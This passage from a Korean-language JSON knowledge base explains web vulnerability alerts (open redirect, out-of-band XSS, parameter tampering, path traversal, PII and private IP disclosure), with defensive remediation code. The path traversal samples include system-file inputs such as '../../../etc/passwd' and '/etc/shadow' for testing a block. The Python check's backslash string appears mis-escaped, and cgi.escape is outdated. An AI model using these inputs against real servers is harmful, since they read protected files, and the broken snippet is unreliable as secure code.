    "example_headers": "\n# 웹 서버 설정 (Nginx 예시)\n# 캐시되지 않도록 설정\nlocation /private_data {\n\tadd_header Cache-Control \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\";\n\tadd_header Pragma \"no-cache\";\n\tadd_header Expires \"0\";\n\t# ...\n}\n\n# Apache httpd.conf 또는 .htaccess 예시\n<FilesMatch \"\\.(php|html|json)$\">\n\tHeader set Cache-Control \"no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0\"\n\tHeader set Pragma \"no-cache\"\n\tHeader set Expires \"0\"\n</FilesMatch>\n\n# Node.js Express 예시\napp.get('/sensitive-info', (req, res) => {\n\tres.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0');\n\tres.set('Pragma', 'no-cache');\n\tres.set('Expires', '0');\n\tres.send('This is sensitive information.');\n});\n\t\t"
  },
  "Obsolete Content Security Policy (CSP) Header Found": {
    "translated": "구식 CSP 헤더 발견 – 더 이상 사용되지 않는 CSP 헤더(예: X-Content-Security-Policy)가 발견됨",
    "description": "구식 또는 더 이상 사용되지 않는 CSP 지시어가 발견되었습니다. 이는 CSP가 최신 위협에 대한 방어 기능을 충분히 제공하지 못하거나, 보안 취약점을 만들 수 있음을 의미합니다.",
    "solution_guidelines": [
      "**최신 CSP Level 2/3 문법 사용:** `report-uri` 대신 `report-to`를 사용하고, 더 세분화된 지시어(`script-src-elem`, `script-src-attr` 등)를 활용하여 정책을 강화합니다.",
      "**`unsafe-inline` 및 `unsafe-eval` 사용 최소화/제거:** 이 지시어들은 XSS 공격에 취약하므로, 해시(Hash) 또는 Nonce 기반의 CSP를 사용하여 인라인 스크립트/스타일을 안전하게 허용합니다.",
      "**CSP 정책 최적화:** 실제 애플리케이션에서 필요한 리소스만 허용하도록 정책을 세밀하게 조정하여, 불필요하게 넓은 범위의 출처를 허용하지 않도록 합니다.",
      "**CSP Tester 활용:** CSP 정책을 테스트하고 최적화하는 온라인 도구(예: CSP Evaluator)를 활용합니다."
    ],
    "example_csp_modern": "\n# 웹 서버 설정 (Nginx 예시)\n# report-uri 대신 report-to (reporting API 설정 필요)\nadd_header Content-Security-Policy \"\n\tdefault-src 'self';\n\tscript-src 'self' 'nonce-randomstring' https://cdn.example.com;\n\tstyle-src 'self' 'unsafe-inline' https://cdn.example.com;\n\timg-src 'self' data:;\n\tfont-src 'self' https://fonts.gstatic.com;\n\tconnect-src 'self' wss://example.com;\n\tframe-ancestors 'self';\n\tobject-src 'none';\n\tbase-uri 'self';\n\tform-action 'self';\n\treport-to csp-endpoint;\n\";\n\n# Apache httpd.conf 또는 .htaccess 예시\n# Header set Content-Security-Policy \"\n# \tdefault-src 'self';\n# \tscript-src 'self' 'nonce-randomstring' https://cdn.example.com;\n# \tstyle-src 'self' 'unsafe-inline' https://cdn.example.com;\n# \timg-src 'self' data:;\n# \tfont-src 'self' https://fonts.gstatic.com;\n# \tconnect-src 'self' wss://example.com;\n# \tframe-ancestors 'self';\n# \tobject-src 'none';\n# \tbase-uri 'self';\n# \tform-action 'self';\n# \treport-to csp-endpoint;\n# \"\n\t\t"
  },
  "Off-site Redirect": {
    "translated": "외부 리다이렉션 – 사용자를 악의적인 외부 웹사이트로 넘길 수 있는 취약점",
    "description": "웹 애플리케이션이 사용자 입력(예: URL 파라미터)을 검증하지 않고 리다이렉션 URL로 사용하여, 공격자가 사용자를 악성 사이트로 리다이렉트시킬 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**화이트리스트 기반 유효성 검사:** 리다이렉트될 수 있는 허용된 도메인 또는 경로 목록(화이트리스트)을 정의하고, 사용자 입력 URL이 이 목록에 포함되는지 엄격하게 검증합니다.",
      "**상대 경로 사용:** 가능한 경우 절대 URL 대신 상대 경로를 사용하여 동일 도메인 내 리다이렉션만 허용합니다.",
      "**리다이렉션 전 사용자에게 경고:** 외부 사이트로 리다이렉션되기 전에 사용자에게 경고 메시지를 표시하여 확인하도록 합니다.",
      "**URL 인코딩 및 디코딩 주의:** URL 파싱 및 구성 시 인코딩/디코딩 문제로 인해 유효성 검사가 우회될 수 있으므로 주의합니다."
    ],
    "example_java_spring_redirect": "\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.servlet.view.RedirectView;\n\nimport java.util.Arrays;\nimport java.util.List;\n\n@Controller\npublic class RedirectController {\n\n\tprivate final List<String> ALLOWED_REDIRECT_DOMAINS = Arrays.asList(\n\t\t\"www.example.com\",\n\t\t\"sub.example.com\"\n\t);\n\n\t// Insecure: vulnerable to open redirect\n\t// @GetMapping(\"/redirect-insecure\")\n\t// public RedirectView redirectInsecure(@RequestParam String url) {\n\t// \treturn new RedirectView(url);\n\t// }\n\n\t// Secure: 화이트리스트 기반 유효성 검사\n\t@GetMapping(\"/redirect-secure\")\n\tpublic RedirectView redirectSecure(@RequestParam String url) {\n\t\ttry {\n\t\t\tjava.net.URL parsedUrl = new java.net.URL(url);\n\t\t\tString host = parsedUrl.getHost();\n\t\t\tif (ALLOWED_REDIRECT_DOMAINS.contains(host)) {\n\t\t\t\treturn new RedirectView(url);\n\t\t\t}\n\t\t} catch (java.net.MalformedURLException e) {\n\t\t\t// URL 형식이 잘못된 경우\n\t\t}\n\t\t// 허용되지 않거나 유효하지 않은 URL인 경우 기본 페이지로 리다이렉트\n\t\treturn new RedirectView(\"/error\");\n\t}\n\n\t// Secure: 상대 경로 리다이렉트 (가장 안전)\n\t@GetMapping(\"/dashboard\")\n\tpublic String showDashboard(@RequestParam(required = false) String returnPath) {\n\t\tif (returnPath != null && returnPath.startsWith(\"/\")) {\n\t\t\t// 내부 경로만 허용 (루트 '/'로 시작하는 경로)\n\t\t\treturn \"redirect:\" + returnPath;\n\t\t}\n\t\treturn \"dashboard\"; // 기본 페이지\n\t}\n}\n\t\t"
  },
  "Old Asp.Net Version in Use": {
    "translated": "오래된 ASP.NET 버전 사용 중 – 구식 ASP.NET 버전이 사용되어 취약할 수 있음",
    "description": "사용 중인 ASP.NET 버전이 오래되어 알려진 보안 취약점에 노출될 수 있음을 나타냅니다. 오래된 버전은 일반적으로 최신 보안 패치가 적용되지 않습니다.",
    "solution_guidelines": [
      "**ASP.NET 최신 버전으로 업그레이드:** 가능한 한 최신 .NET Framework 또는 .NET (Core) 버전으로 업그레이드하여 최신 보안 패치와 기능을 활용합니다.",
      "**보안 업데이트 적용:** .NET Framework 사용 시 Microsoft에서 배포하는 보안 업데이트를 주기적으로 적용합니다.",
      "**불필요한 정보 노출 방지:** `X-AspNet-Version` 및 `X-AspNetMvc-Version`과 같은 HTTP 헤더가 버전 정보를 노출하지 않도록 설정합니다."
    ],
    "example_dotnet_version_hide": "\n<system.web>\n\t<httpRuntime enableVersionHeader=\"false\" />\n</system.web>\n<system.webServer>\n\t<security>\n\t\t<requestFiltering>\n\t\t\t<add header=\"X-AspNet-Version\" denySpecified=\"true\" />\n\t\t\t<add header=\"X-AspNetMvc-Version\" denySpecified=\"true\" />\n\t\t</requestFiltering>\n\t</security>\n\t<httpProtocol>\n\t\t<customHeaders>\n\t\t\t<remove name=\"X-Powered-By\" />\n\t\t\t<remove name=\"X-AspNet-Version\" />\n\t\t\t<remove name=\"X-AspNetMvc-Version\" />\n\t\t</customHeaders>\n\t</httpProtocol>\n</system.webServer>\n\t\t"
  },
  "Out of Band XSS": {
    "translated": "아웃 오브 밴드 XSS – XSS 공격 결과가 웹 페이지에 직접 나타나지 않고 다른 채널로 전달되는 공격",
    "description": "일반적인 XSS(Reflected, Stored)와 달리, 공격자의 페이로드가 웹 애플리케이션의 정상적인 응답 흐름 밖에서 실행되는 XSS 유형입니다. 주로 서버 측에서 로그, 관리자 대시보드, 이메일 알림 등으로 처리될 때 발생합니다.",
    "solution_guidelines": [
      "**모든 사용자 입력에 대한 출력 인코딩:** 데이터가 HTML, JavaScript, URL, CSS 등 어떤 컨텍스트에 삽입되더라도 해당 컨텍스트에 맞는 적절한 출력 인코딩을 적용합니다.",
      "**로그 및 관리자 페이지 보안:** 사용자 입력이 포함될 수 있는 모든 로그, 관리자 대시보드, 알림 시스템 등에 대해서도 강력한 출력 인코딩을 적용합니다.",
      "**신뢰할 수 없는 데이터 검증 및 살균:** 사용자 입력값을 저장하기 전에 유효성을 검사하고, 위험한 문자열을 제거하는 살균(sanitization) 과정을 거칩니다.",
      "**콘텐츠 보안 정책 (CSP) 강화:** `default-src`, `script-src` 등을 엄격하게 설정하여 악성 스크립트 실행을 방지합니다.",
      "**백엔드 시스템 접근 제어:** 내부 시스템(로그 서버, 메일 서버 등)에 대한 접근을 엄격히 통제합니다."
    ],
    "example_encoding_general": "\n# Out of Band XSS 방어 가이드라인:\n# 1. 서버 측 로깅 시스템 (ELK Stack 등)에 사용자 입력이 포함되는 경우, 반드시 로그 출력 시 적절한 인코딩을 적용합니다.\n# 2. 관리자 대시보드나 리포팅 도구에서 사용자 생성 콘텐츠를 표시할 때는 HTML 엔티티 인코딩을 수행합니다.\n# 3. 이메일 알림에 사용자 입력이 포함될 경우, HTML 이메일이면 적절히 인코딩하고, 텍스트 이메일이면 일반 텍스트로 처리합니다.\n# 4. 웹 방화벽(WAF)을 사용하여 XSS 공격 패턴을 탐지하고 차단합니다.\n# 5. 모든 입력 필드에 대한 강력한 화이트리스트 기반 유효성 검사를 적용합니다.\n\n# Java (OWASP ESAPI 또는 Apache Commons Text StringEscapeUtils)\n// import org.owasp.esapi.ESAPI;\n// import org.owasp.esapi.Encoder;\n// String safeOutput = ESAPI.encoder().encodeForHTML(userInput);\n\n// import org.apache.commons.text.StringEscapeUtils;\n// String safeOutput = StringEscapeUtils.escapeHtml4(userInput);\n\n# Python (cgi.escape 또는 html.escape)\n# import cgi\n# safe_output = cgi.escape(user_input, quote=True)\n\n# import html\n# safe_output = html.escape(user_input, quote=True)\n\t\t"
  },
  "PII Disclosure": {
    "translated": "개인 식별 정보(PII) 노출 – 주민등록번호, 이름, 주소 등 개인 식별 정보가 웹 페이지나 통신에서 노출됨",
    "description": "개인 식별 정보(PII)가 웹 애플리케이션의 응답, URL, 오류 메시지, 로그 등에 의도치 않게 노출되는 취약점입니다.",
    "solution_guidelines": [
      "**PII 저장 최소화:** 애플리케이션에 필요한 최소한의 PII만 수집하고 저장합니다. 불필요한 정보는 수집하지 않습니다.",
      "**전송 및 저장 시 암호화:** PII는 전송 시 HTTPS를 통해 암호화하고, 저장 시에도 강력한 암호화 알고리즘을 사용하여 암호화합니다.",
      "**로그 및 오류 메시지에서 PII 제거:** 개발/운영 환경에서 생성되는 로그 파일, 오류 메시지, 디버그 정보 등에 PII가 포함되지 않도록 마스킹하거나 제거합니다.",
      "**URL 및 HTTP 헤더에 PII 포함 금지:** URL 쿼리 파라미터나 HTTP 헤더에 PII를 직접 포함하지 않습니다.",
      "**접근 제어 강화:** PII에 접근할 수 있는 사용자와 시스템을 엄격하게 제한하고, 접근 권한을 최소화합니다.",
      "**데이터 비식별화/가명화:** 분석 또는 테스트 목적으로 PII를 사용할 때는 비식별화 또는 가명화 처리된 데이터를 사용합니다."
    ],
    "example_general": "\n# PII Disclosure 방지 개발 가이드라인:\n# 1. 민감 데이터 입력 필드는 자동 완성 기능을 비활성화 (autocomplete=\"off\")합니다.\n# 2. 클라이언트 측에서 PII를 직접적으로 보관하지 않도록 합니다.\n# 3. 데이터베이스 스키마 설계 시 PII 필드는 암호화 여부 및 접근 통제 정책을 명확히 합니다.\n# 4. API 응답에서 PII를 반환할 때는 필요한 경우에만 최소한으로 노출하고, 토큰 등으로 대체합니다.\n# 5. `robots.txt`나 `X-Robots-Tag`를 사용하여 검색 엔진이 PII가 포함된 페이지를 인덱싱하지 못하도록 합니다.\n# 6. 정기적인 데이터 삭제 정책을 수립하고 실행합니다.\n\t\t"
  },
  "Parameter Tampering": {
    "translated": "파라미터 변조 – URL 파라미터나 폼 데이터를 수동으로 변경하여 애플리케이션 로직을 우회하거나 비정상적인 동작을 유발하는 공격",
    "description": "클라이언트가 웹 애플리케이션으로 전송하는 HTTP 파라미터(URL 쿼리, 폼 필드, HTTP 헤더, 쿠키 등)를 조작하여, 비즈니스 로직을 우회하거나 비인가된 작업을 수행할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**모든 사용자 입력은 신뢰하지 않음:** 클라이언트로부터 받은 모든 입력은 서버 측에서 재검증하고, 절대로 클라이언트 측에서만 유효성 검사를 수행하지 않습니다.",
      "**민감한 값은 서버 측에서 관리:** 가격, 재고, 사용자 권한, 주문 상태 등 민감한 비즈니스 로직에 사용되는 값은 서버 측에서만 관리하고, 클라이언트에 노출하거나 클라이언트로부터 직접 받지 않도록 합니다.",
      "**세션 기반 데이터 사용:** 주문 처리 과정 등 상태를 유지해야 하는 경우, 클라이언트에 숨겨진 필드(hidden field) 대신 서버 측 세션에 데이터를 저장하고 세션 ID를 통해 참조합니다.",
      "**HMAC 또는 암호화 사용:** 클라이언트에게 전송되어 다시 돌아오는 데이터(예: ViewState, 주문 정보)는 HMAC(Hash-based Message Authentication Code)를 사용하여 무결성을 확인하거나 암호화하여 변조를 방지합니다.",
      "**권한 검사:** 사용자가 요청한 작업에 대한 권한이 있는지 서버 측에서 항상 확인합니다.",
      "**강력한 유효성 검사:** 데이터 타입, 길이, 형식, 허용 범위 등을 포함한 모든 입력에 대한 강력한 유효성 검사를 수행합니다."
    ],
    "example_java_parameter_tampering": "\n// Java Spring Boot 예시\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.PostMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\n\n@Controller\npublic class OrderController {\n\n\t// Insecure: price is taken directly from client (vulnerable to parameter tampering)\n\t// @PostMapping(\"/order-insecure\")\n\t// public String createOrderInsecure(@RequestParam String item, @RequestParam double price) {\n\t// \t// Business logic uses client-provided price\n\t// \tSystem.out.println(\"Processing order for \" + item + \" at price: \" + price);\n\t// \treturn \"order_success\";\n\t// }\n\n\t// Secure: price is retrieved from server-side database\n\t@PostMapping(\"/order-secure\")\n\tpublic String createOrderSecure(@RequestParam String itemId, @RequestParam int quantity) {\n\t\t// Assume itemId is validated and corresponds to a product in the database\n\t\tProduct product = getProductFromDatabase(itemId); // Retrieve price from server-side\n\t\tif (product == null) {\n\t\t\treturn \"error_item_not_found\";\n\t\t}\n\t\tdouble calculatedPrice = product.getPrice() * quantity;\n\t\tSystem.out.println(\"Processing order for \" + product.getName() + \" (x\" + quantity + \") at price: \" + calculatedPrice);\n\t\t// ... further processing ...\n\t\treturn \"order_success\";\n\t}\n\n\tprivate Product getProductFromDatabase(String itemId) {\n\t\t// This would connect to a database to fetch product details\n\t\tif (\"PROD123\".equals(itemId)) {\n\t\t\treturn new Product(\"PROD123\", \"Laptop\", 1200.00);\n\t\t}\n\t\treturn null;\n\t}\n\n\tstatic class Product {\n\t\tString id;\n\t\tString name;\n\t\tdouble price;\n\n\t\tpublic Product(String id, String name, double price) {\n\t\t\tthis.id = id;\n\t\t\tthis.name = name;\n\t\t\tthis.price = price;\n\t\t}\n\n\t\tpublic String getId() { return id; }\n\t\tpublic String getName() { return name; }\n\t\tpublic double getPrice() { return price; }\n\t}\n}\n\t\t"
  },
  "Path Traversal": {
    "translated": "경로 탐색 – 파일 경로에 '../' 등을 삽입하여 웹 서버의 상위 디렉토리에 접근하거나 민감한 파일을 읽는 공격",
    "description": "사용자 입력이 파일 경로에 사용될 때 적절히 검증되지 않아, 공격자가 `../`와 같은 문자를 사용하여 서버의 임의 파일이나 디렉토리에 접근할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**경로 정규화 및 화이트리스트:** 사용자 입력을 기반으로 파일 경로를 구성하기 전에, 경로를 정규화(`java.nio.file.Path.normalize()`, `os.path.abspath()` 등)하고, 허용된 경로(화이트리스트) 내에 있는지 확인합니다.",
      "**사용자 입력 직접 사용 금지:** 사용자 입력값을 파일 경로의 일부로 직접 사용하지 않고, 파일 ID 등 내부적으로 관리되는 식별자를 사용합니다.",
      "**최소 권한 원칙:** 웹 서버가 접근할 수 있는 디렉토리 및 파일 권한을 최소화합니다.",
      "**파일 확장자 검증:** 업로드 또는 다운로드되는 파일의 확장자를 검증하여 허용된 형식만 처리하도록 합니다.",
      "**경로 필터링:** `../`, `..\\`, `/../`, `\\..\\`와 같은 경로 탐색 시퀀스를 제거하거나, 허용하지 않습니다 (정규화가 더 권장됨)."
    ],
    "example_java_path_traversal": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.InvalidPathException;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\npublic class PathTraversalExample {\n\n    private static final String BASE_DIRECTORY = \"/var/www/uploads/\"; // 안전한 베이스 디렉토리\n\n    // Insecure: vulnerable to path traversal\n    // public void downloadFileInsecure(String filename) {\n    // \t File file = new File(BASE_DIRECTORY + filename);\n    // \t // ... download logic ...\n    // }\n\n    // Secure: path normalization and validation\n    public void downloadFileSecure(String filename) throws IOException {\n        if (filename == null || filename.contains(\"..\") || filename.contains(\"/\") || filename.contains(\"\\\\\")) {\n            throw new IllegalArgumentException(\"Invalid filename.\");\n        }\n\n        try {\n            Path fileToDownload = Paths.get(BASE_DIRECTORY, filename).normalize();\n\n            // 중요: 정규화된 경로가 여전히 베이스 디렉토리 내에 있는지 확인\n            if (!fileToDownload.startsWith(BASE_DIRECTORY)) {\n                throw new SecurityException(\"Attempted path traversal detected.\");\n            }\n\n            File file = fileToDownload.toFile();\n            if (!file.exists() || !file.isFile()) {\n                throw new IOException(\"File not found or is not a regular file.\");\n            }\n            System.out.println(\"Securely accessing file: \" + file.getAbsolutePath());\n            // ... download logic ...\n        } catch (InvalidPathException | SecurityException e) {\n            System.err.println(\"Error accessing file: \" + e.getMessage());\n        }\n    }\n\n    public static void main(String[] args) throws IOException {\n        PathTraversalExample app = new PathTraversalExample();\n        // app.downloadFileInsecure(\"../../../etc/passwd\"); // Example of insecure usage\n\n        app.downloadFileSecure(\"report.txt\"); // Secure access\n        app.downloadFileSecure(\"../../../etc/passwd\"); // Blocked by security check\n        app.downloadFileSecure(\"/etc/passwd\"); // Blocked by security check\n    }\n}",
    "example_python_path_traversal": "import os\n\nBASE_DIRECTORY = \"/var/www/uploads/\"\n\ndef download_file_secure(filename):\n    if not filename or \"..\" in filename or \"/\" in filename or \"\\\" in filename:\n        raise ValueError(\"Invalid filename.\")\n\n    try:\n        # Construct the full path and normalize it\n        full_path = os.path.normpath(os.path.join(BASE_DIRECTORY, filename))\n\n        # IMPORTANT: Check if the normalized path still starts with the base directory\n        # This prevents cases like filename=\"../../etc/passwd\" where normalize might remove '..'\n        # but the effective path is outside.\n        if not full_path.startswith(BASE_DIRECTORY):\n            raise PermissionError(\"Attempted path traversal detected.\")\n\n        if not os.path.exists(full_path) or not os.path.isfile(full_path):\n            raise FileNotFoundError(\"File not found or is not a regular file.\")\n\n        print(f\"Securely accessing file: {full_path}\")\n        # ... download logic ...\n        with open(full_path, 'r') as f:\n            print(f.read(100)) # Read first 100 chars\n    except (ValueError, PermissionError, FileNotFoundError) as e:\n        print(f\"Error accessing file: {e}\")\n\n# Example usage:\ndownload_file_secure(\"document.pdf\")\ndownload_file_secure(\"../../../etc/passwd\") # Will be blocked\ndownload_file_secure(\"/etc/shadow\") # Will be blocked\n    "
  },
  "Permissions Policy Header Not Set": {
    "translated": "Permissions Policy 헤더 미설정 – 브라우저 기능(카메라, 마이크 등)을 제어하는 보안 정책 헤더가 없음",
    "description": "브라우저가 웹 페이지에서 특정 브라우저 기능(예: 카메라, 마이크, Geolocation)에 접근하는 것을 제어하는 `Permissions-Policy` (구 `Feature-Policy`) 헤더가 누락되어 있습니다. 이는 민감한 기능에 대한 무단 접근을 허용할 수 있습니다.",
    "solution_guidelines": [
      "**`Permissions-Policy` 헤더 설정:** 웹 서버 또는 애플리케이션에서 `Permissions-Policy` 헤더를 설정하여 웹 페이지에서 사용될 수 있는 브라우저 기능을 명시적으로 제어합니다.",
      "**최소 권한 원칙:** 애플리케이션에 필요한 최소한의 기능만 허용하고, 사용하지 않는 기능은 `none`으로 설정하여 명시적으로 비활성화합니다.",
      "**보안 및 사용자 경험 고려:** 카메라, 마이크 등 민감한 기능을 허용할 때는 사용자 동의를 얻는 절차를 명확히 합니다."
    ],
    "example_permissions_policy_header": "# 웹 서버 설정 (Nginx 예시)\nadd_header Permissions-Policy \"geolocation=(), microphone=(), camera=(), payment=()\"; # 모든 기능 비활성화 예시\n# add_header Permissions-Policy \"geolocation=(self), fullscreen=(self)\"; # 특정 기능은 동일 출처에서만 허용 예시\n\n# Apache httpd.conf 또는 .htaccess 예시\n# Header always set Permissions-Policy \"geolocation=(), microphone=(), camera=(), payment=()\"\n    "
  },
  "Personally Identifiable Information via WebSocket": {
    "translated": "웹소켓을 통한 개인 식별 정보 노출 – 웹소켓 통신을 통해 개인 식별 정보가 노출됨",
    "description": "WebSocket 통신을 통해 개인 식별 정보(PII)가 암호화되지 않거나 부적절하게 전송되어 가로채기 공격에 노출될 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**WebSocket Secure (WSS) 사용:** 모든 WebSocket 통신은 반드시 `wss://` 프로토콜을 사용하여 암호화된 채널로 이루어져야 합니다. 일반 `ws://`는 사용하지 않습니다.",
      "**WebSocket 인증 및 인가:** WebSocket 연결 시에도 사용자 인증 및 인가 절차를 수행하여 비인가된 접근을 방지합니다. (예: JWT를 이용한 토큰 기반 인증)",
      "**PII 최소화:** WebSocket을 통해 전송되는 PII의 양을 최소화하고, 필요한 경우에만 전송합니다.",
      "**PII 암호화 (추가 보안):** WSS를 사용하더라도, 매우 민감한 PII는 애플리케이션 수준에서 추가적으로 암호화하여 전송하는 것을 고려합니다.",
      "**로그 및 모니터링:** WebSocket 트래픽에 대한 로깅 및 모니터링을 수행하여 비정상적인 활동을 감지합니다."
    ],
    "example_websocket_secure": "# JavaScript (클라이언트 측)\n// Insecure: ws:// (사용하지 않음)\n// const ws = new WebSocket('ws://example.com/chat');\n\n// Secure: wss:// 사용\nconst ws = new WebSocket('wss://secure.example.com/chat');\n\nws.onopen = () => {\n    console.log('Connected to WebSocket (Secure)');\n    // PII 전송 시 주의: 암호화되지만, 필요한 경우에만 전송\n    ws.send(JSON.stringify({ type: 'message', content: 'Hello, World!' }));\n    // PII 포함 시 예시 (실제로는 암호화 후 전송 고려)\n    // ws.send(JSON.stringify({ type: 'user_info', name: 'John Doe', email: 'john.doe@example.com' }));\n};\n\nws.onmessage = (event) => {\n    console.log('Received:', event.data);\n};\n\nws.onerror = (error) => {\n    console.error('WebSocket Error:', error);\n};\n\nws.onclose = () => {\n    console.log('WebSocket Disconnected');\n};\n\n# Node.js (서버 측 - 'ws' 라이브러리 예시)\n// wss://를 사용하려면 SSL 인증서 설정이 필요합니다.\nconst WebSocket = require('ws');\nconst https = require('https');\nconst fs = require('fs');\n\nconst server = https.createServer({\n    cert: fs.readFileSync('/path/to/your/cert.pem'),\n    key: fs.readFileSync('/path/to/your/key.pem')\n});\n\nconst wss = new WebSocket.Server({ server });\n\nwss.on('connection', ws => {\n    console.log('Client connected via WSS');\n    ws.on('message', message => {\n        console.log(`Received message: ${message}`);\n        // PII 처리 로직: 항상 검증하고, 불필요한 PII는 저장/로그하지 않음\n        // ws.send(`Server received: ${message}`);\n    });\n    ws.send('Welcome!');\n});\n\nserver.listen(8080);\n    "
  },
  "Possible Username Enumeration": {
    "translated": "잠재적 사용자명 열거 – 로그인 오류 메시지 등을 통해 유효한 사용자 이름을 추측할 수 있어 무차별 대입 공격에 악용될 수 있음",
    "description": "로그인 페이지나 비밀번호 재설정 페이지 등에서 사용자 이름의 존재 여부에 따라 다른 오류 메시지(예: '사용자 이름이 존재하지 않습니다' vs. '비밀번호가 일치하지 않습니다')를 반환하여 공격자가 유효한 사용자 이름을 추측할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**일반적인 오류 메시지 사용:** 로그인 실패 시 사용자 이름이 존재하는지 여부에 관계없이 항상 동일하고 일반적인 오류 메시지(예: '사용자 이름 또는 비밀번호가 올바르지 않습니다')를 반환합니다.",
      "**비밀번호 재설정 페이지 강화:** 비밀번호 재설정 시 사용자 이름의 존재 여부를 직접적으로 노출하지 않고, '비밀번호 재설정 링크가 제공된 경우 이메일을 확인하십시오'와 같은 일반적인 메시지를 사용합니다.",
      "**CAPTCHA 또는 Rate Limiting:** 로그인 시도 및 비밀번호 재설정 시도에 대해 CAPTCHA를 적용하거나, 특정 시간 동안 실패한 로그인 시도 횟수를 제한하여 무차별 대입 공격 및 사용자 이름 열거를 어렵게 만듭니다.",
      "**로깅 및 모니터링:** 비정상적인 로그인 시도 패턴이나 사용자 이름 열거 시도를 탐지하고 경고하는 시스템을 구축합니다."
    ],
    "example_login_error_message": "# 인증 로직 (Pseudo Code)\nfunction login(username, password):\n    user = findUserByUsername(username)\n    if user is None:\n        # Insecure: \"Username does not exist.\"\n        # Secure:\n        return \"Invalid username or password.\"\n    else:\n        if verifyPassword(user, password):\n            return \"Login successful.\"\n        else:\n            # Insecure: \"Incorrect password.\"\n            # Secure:\n            return \"Invalid username or password.\"\n\n# Spring Security (Java) 예시:\n# Spring Security는 기본적으로 사용자 이름 열거 공격에 대해 견고하게 설계되어 있습니다.\n# BadCredentialsException (사용자 이름/비밀번호 불일치) 또는 UsernameNotFoundException (사용자 없음)이 발생해도\n# 기본적으로 클라이언트에는 \"Bad credentials\" 또는 \"자격 증명 오류\"와 같은 일반적인 메시지를 반환합니다.\n# 커스텀 예외 핸들링 시에도 특정 예외 타입을 노출하지 않도록 주의합니다.\n    "
  },
  "Potential IP Addresses Found in the Viewstate": {
    "translated": "ViewState 내 잠재적 IP 주소 발견 – ASP.NET ViewState 내부에 IP 주소가 포함되어 노출될 수 있음",
    "description": "ASP.NET의 ViewState 데이터 내부에 잠재적으로 민감한 IP 주소(클라이언트, 서버 또는 내부 네트워크)가 포함되어 있어 정보 유출로 이어질 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**ViewState에 민감 정보 저장 금지:** IP 주소, 개인 식별 정보(PII), 세션 ID 등 민감한 정보를 ViewState에 직접 저장하지 않습니다.",
      "**ViewState 암호화 및 무결성 보호 활성화:** MachineKey를 사용하여 ViewState의 암호화(Encryption)와 무결성(Integrity) 보호를 활성화하여 변조 및 정보 유출을 방지합니다.",
      "**ViewState 최소화:** ViewState의 크기를 줄여 클라이언트 전송량을 줄이고, 필요한 최소한의 데이터만 저장하도록 합니다.",
      "**다른 상태 관리 기술 고려:** 세션, 데이터베이스, 캐시 등 서버 측 상태 관리 기술을 사용하여 민감 정보를 관리하는 것을 고려합니다."
    ],
    "example_aspnet_viewstate_fix": "<system.web>\n    <machineKey validationKey=\"AutoGenerate,IsolateApps\" decryptionKey=\"AutoGenerate,IsolateApps\"\n                validation=\"AES\" decryption=\"Auto\" />\n    <pages enableViewStateMac=\"true\" viewStateEncryptionMode=\"Always\" />\n</system.web>\n\n// C# 코드 예시 (ViewState에 직접 IP 주소 저장 방지)\n// protected void Page_Load(object sender, EventArgs e)\n// {\n// \t if (!IsPostBack)\n// \t {\n// \t \t // ViewState[\"ClientIP\"] = Request.UserHostAddress; // Avoid this!\n// \t \t // 대신, 세션 또는 서버 측 캐시에 저장:\n// \t \t Session[\"ClientIP\"] = Request.UserHostAddress;\n// \t }\n// }\n    "
  },
  "Private IP Disclosure": {
    "translated": "사설 IP 노출 – 내부망에서 사용되는 사설 IP 주소가 웹 페이지나 응답 헤더를 통해 노출됨",
    "description": "웹 애플리케이션의 응답(예: HTTP 헤더, HTML 주석, 오류 메시지, 리다이렉션 URL)을 통해 서버 또는 내부 네트워크의 사설 IP 주소가 외부에 노출되는 취약점입니다.",
    "solution_guidelines": [
      "**내부 IP 주소 정보 제거:** 웹 서버 설정(Apache, Nginx, IIS), 애플리케이션 코드, 로드 밸런서/프록시 설정에서 응답에 내부 IP 주소가 포함되지 않도록 합니다.",
      "**오류 메시지 일반화:** 상세한 오류 메시지(스택 트레이스 포함)가 사용자에게 노출되지 않도록 일반적인 오류 페이지만 제공합니다.",
      "**HTTP 헤더 검토:** `Via`, `X-Forwarded-For` 등의 프록시 관련 헤더에 내부 IP 주소가 포함되지 않도록 프록시/로드 밸런서 설정을 확인합니다.",
      "**주석 제거:** 프로덕션 환경 배포 전에 HTML, CSS, JavaScript 등에서 개발 또는 디버깅 목적으로 삽입된 주석을 제거합니다.",
      "**리다이렉션 URL 검증:** 리다이렉션 URL에 내부 IP 주소가 포함되지 않도록 합니다."
    ],
    "example_nginx_proxy_fix": "# Nginx 설정 예시: X-Forwarded-For 헤더에서 내부 IP 제거\nproxy_set_header X-Real-IP $remote_addr;\nproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # 이 헤더에 내부 IP가 포함되지 않도록 합니다.\n# 실제 클라이언트 IP만 전달하고 싶다면, $proxy_add_x_forwarded_for 대신 $remote_addr을 사용하는 것이 좋습니다.\n# 또는, 내부 네트워크에서 오는 요청에 대해서만 $proxy_add_x_forwarded_for를 전달하도록 조건부 설정을 합니다.\n# proxy_set_header X-Forwarded-For $remote_addr;\n\n# Apache 설정 예시: mod_remoteip 사용 또는 커스텀 로깅 포맷 수정\n# mod_remoteip 사용 시:\n# RemoteIPHeader X-Forwarded-For\n# RemoteIPTrustedProxy 192.168.1.0/24 # 내부 프록시 IP 대역 지정\n\n# HTTP 응답 헤더에서 불필요한 정보 제거\n# Header unset Server\n# Header unset X-Powered-By\n# Header unset X-AspNet-Version\n    "
  },
  "Private IP Disclosure via WebSocket": {
    "translated": "웹소켓을 통한 사설 IP 노출 – 웹소켓 통신을 통해 사설 IP 주소가 노출됨",
